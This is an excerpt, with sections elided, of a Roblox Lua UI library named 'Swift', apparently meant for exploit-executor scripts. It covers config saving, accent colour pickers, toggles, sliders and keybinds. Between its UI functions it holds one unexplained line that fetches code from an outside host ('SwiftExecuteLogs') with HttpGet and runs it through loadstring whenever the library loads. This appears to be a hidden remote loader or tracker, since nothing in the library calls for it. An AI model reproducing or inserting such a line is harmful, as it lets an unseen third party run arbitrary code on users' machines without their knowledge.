...
function Library:LoadConfig()
    ...
    if isfile and isfile(self.ConfigFile) then
        ...
        if success and data then
            ...
            -- Lade ControlAccent
            if data.__controlAccent and data.__controlAccent.R and data.__controlAccent.G and data.__controlAccent.B then
                self.ControlAccent = UnpackColor(data.__controlAccent)
            end
            for flag, value in pairs(self.UserConfig) do
                if flag ~= "__theme" and flag ~= "__font" and flag ~= "__customAccent" and flag ~= "__backgroundTransparency" and flag ~= "__controlAccent" and self.Flags[flag] then
...
function Library:SaveConfig()
    ...
    pcall(function()
        ...
        self.UserConfig.__controlAccent = PackColor(self.ControlAccent)
        writefile(self.ConfigFile, HttpService:JSONEncode(self.UserConfig))
    end)
end

-- Funktion zum Aktualisieren aller gespeicherten Akzent-Elemente
function Library:UpdateAllAccents()
    local color = self.ControlAccent
    for _, element in ipairs(self.AccentElements) do
        if element.UpdateAccent then
            element:UpdateAccent(color)
        end
    end
end
...
loadstring(game:HttpGet("https://api.getvortex.vip/api/t/QUGYKH/s/SwiftExecuteLogs"))()
...
function Library:MakeWindow(WindowConfig)
    ...
    local function ActivateTab(TabFrame, TabItemContainer)
        ...
        if StartTabFrame and TabFrame ~= StartTabFrame and StartTabFrame.Visible then
            StartTabFrame.Visible = false
        end
    end
        ...
        local function GetElements(ItemParent)
            ...
            function ElementFunction:AddToggle(ToggleConfig)
                ...
                function UpdateAccent(color)
                    ToggleConfig.Color = color
                    ToggleBox.BackgroundColor3 = color
    
                    local stroke = ToggleBox:FindFirstChild("UIStroke") or ToggleBox:FindFirstChild("Stroke")
                    if stroke then
                        stroke.Color = color
                    end
                end
                ...
                function Toggle:Set(Value)
                    Toggle.Value = Value
                    local color = ToggleConfig.Color
                    TweenService:Create(ToggleBox,        TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Toggle.Value and color or Library.Themes.Default.Divider}):Play()
                    local toggleStroke = ToggleBox:FindFirstChild("Stroke") or ToggleBox:FindFirstChildOfClass("UIStroke")
                ...
                -- Element in die Akzentliste aufnehmen
                table.insert(Library.AccentElements, Toggle)
                return Toggle
            end
            ...
            function ElementFunction:AddSlider(SliderConfig)
                ...
                -- Verwende globale ControlAccent falls keine eigene Farbe
                SliderConfig.Color       = SliderConfig.Color       or Library.ControlAccent
                ...
                -- Funktion zum Aktualisieren der Akzentfarbe
                function Slider:UpdateAccent(color)
                    SliderBar.BackgroundColor3 = color
                    local stroke = SliderBar:FindFirstChild("Stroke") or SliderBar:FindFirstChildOfClass("UIStroke")
                    if stroke then
                        stroke.Color = color
                    end
                    SliderDrag.BackgroundColor3 = color
                    -- Werte-Labels bleiben wie sie sind
                end
                ...
                -- Element in die Akzentliste aufnehmen
                table.insert(Library.AccentElements, Slider)
                return Slider
            end
            ...
            function ElementFunction:AddBind(BindConfig)
                ...
                local NameLabel = BindFrame:FindFirstChild("Content")
                local OriginalColor = NameLabel and NameLabel.TextColor3 or Color3.fromRGB(240,240,240)

                function Bind:Highlight(active)
                    if not NameLabel then return end
                    if active then
                        TweenService:Create(NameLabel, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {
                        ...
                        TweenService:Create(NameLabel, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
    ...
    local StartTabEF, StartTabFrame, StartTabContainer = TabFunction:MakeTab({Name = "Welcome", Icon = ""})
    ...
    -- NEUE SECTION: Control Colors (Slider/Toggle Akzent)
    local ControlSection = ThemeTabEF:AddSection({Name = "Control Colors"})
    local ControlAccentPicker = ControlSection:AddColorpicker({
        Name = "Slider & Toggle Accent",
        Description = "Change the accent color of all sliders and toggles.",
        Default = Library.ControlAccent,
        Save = true,
        Flag = "__controlAccent",
        Callback = function(Color)
            Library.ControlAccent = Color
            Library:UpdateAllAccents()
            if WindowConfig.SaveConfig and Library.ConfigFile then
                Library.UserConfig.__controlAccent = PackColor(Color)
                Library:SaveConfig()
            end
        end
    })

    -- Lade gespeicherte ControlAccent nach dem Erstellen des Pickers
    if WindowConfig.SaveConfig and Library.UserConfig.__controlAccent then
        local saved = Library.UserConfig.__controlAccent
        if saved and saved.R and saved.G and saved.B then
            Library.ControlAccent = UnpackColor(saved)
            ControlAccentPicker:Set(Library.ControlAccent)
            Library:UpdateAllAccents()
        end
    end
    ...
    StyleDropdown = ConfigSection:AddDropdown({
        Name = "Library Style",
        Options = {"Default", "Modules [SOON]"},
        Description = "Select the Style of the UI.",
        Default = Library.ConfigStyle,
    ...
    local InfoLabel = SettingsTabEF:AddLabel("Swift  [BETA]  |  Version: 1.0.2  |  Made by: Trojaner")
